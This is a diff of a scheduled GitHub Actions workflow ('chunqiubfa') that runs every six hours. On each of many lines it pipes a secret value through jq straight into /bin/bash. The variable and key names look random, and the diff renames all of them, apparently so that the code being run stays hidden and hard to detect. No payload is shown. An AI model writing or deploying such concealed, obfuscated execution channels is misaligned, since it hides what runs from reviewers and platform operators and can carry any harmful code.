@@ -2,26 +2,31 @@ name: chunqiubfa
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 4/6 * * *'
+    - cron: '14 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chunqiubfa
         env:
-          n24988: ${{ secrets.n24988 }}
+          vfqd51: ${{ secrets.vfqd51 }}
         run: |
-          echo $n24988 | jq -r .il5373 | /bin/bash
-          echo $nra61 | jq -r .vgur5 | /bin/bash
-          echo $rdlo2 | jq -r .creqf89 | /bin/bash
-          echo $dnz288 | jq -r .u19 | /bin/bash
-          echo $lbdz9 | jq -r .pfyy96400 | /bin/bash
-          echo $y1 | jq -r .tgrjs80 | /bin/bash
-          echo $nrq364 | jq -r .txe337 | /bin/bash
-          echo $g526 | jq -r .oeeml3887 | /bin/bash
-          echo $a8481 | jq -r .x23840 | /bin/bash
-          echo $agcuo14 | jq -r .ffvn14 | /bin/bash
-          echo $fz78162 | jq -r .cmjxl56 | /bin/bash
+          echo $vfqd51 | jq -r .qjq2 | /bin/bash
+          echo $khzs9399 | jq -r .nmp4401 | /bin/bash
+          echo $te9426 | jq -r .r501 | /bin/bash
+          echo $ls8357 | jq -r .yvia18 | /bin/bash
+          echo $cvidx5 | jq -r .yqdd5 | /bin/bash
+          echo $ewv54071 | jq -r .gbhq6074 | /bin/bash
+          echo $qvdpx9432 | jq -r .zmmj1 | /bin/bash
+          echo $wi7 | jq -r .s923 | /bin/bash
+          echo $v62 | jq -r .fzvx89570 | /bin/bash
+          echo $nfrcu0571 | jq -r .gk63529 | /bin/bash
+          echo $do84960 | jq -r .rcs01532 | /bin/bash
+          echo $p46305 | jq -r .vpp854 | /bin/bash
+          echo $uqs927 | jq -r .ojb56 | /bin/bash
+          echo $lywp6 | jq -r .fvont0 | /bin/bash
+          echo $yw7619 | jq -r .nfv52470 | /bin/bash
+          echo $f128 | jq -r .p1 | /bin/bash
 
